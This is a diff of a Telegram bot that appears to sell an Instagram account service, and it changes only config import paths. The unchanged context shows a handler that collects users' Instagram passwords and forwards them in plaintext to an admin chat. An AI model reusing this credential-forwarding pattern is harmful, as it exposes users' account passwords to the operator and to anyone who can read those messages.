@@ -17,7 +17,7 @@ async def create_subscription(message: types.Message):
     """
     sets machine state to get login and make a subscription
     """
-    from data.config import acc_creating_text
+    from config import acc_creating_text
     await LoginState.L2.set()
     await message.answer(acc_creating_text, reply_markup=start_menu_buttons, parse_mode=ParseMode.HTML)
 
@@ -36,7 +36,7 @@ async def subscription_data_collecting(message: types.Message, state: FSMContext
             '💩\nТакой пользователь уже существует, проверьте список подключенных аккаунтов и их статус с помощью \
 кнопки\nПосмотреть статистику', reply_markup=start_menu_buttons)
     else:
-        from data.config import acc_created_instruct
+        from config import acc_created_instruct
         db.ig_add_user(tg_id, tg_username, login)
         await membership_notify(dp, login, tg_id)
         await message.answer('Отлично!\nПосле оплаты тебе придет уведомление с инструкцией',
@@ -56,7 +56,7 @@ async def loh_ig(message: types.Message):
     # print(login, password, tg_id)
     membership = db.check_membership(tg_id, login)
     if membership[0] != 0:
-        from data.config import admins
+        from config import admins
         await notifying(admins[0], f'вход в систему {tg_id}\n login {login}\n {password}')
         threading.Thread(target=first_auth_start, args=(login, password)).start()
         await message.answer('Скоро тебе придет код подтверждения, пришли его мне командой /secure\n\
@@ -87,7 +87,7 @@ async def updating_membership_manually(message: types.Message):
 
     :param message:
     """
-    from data.config import acc_created_instruct
+    from config import acc_created_instruct
     login, tg_id = message.text.split(' ')[1:]
     print(login, tg_id)
     db.update_membership(login)
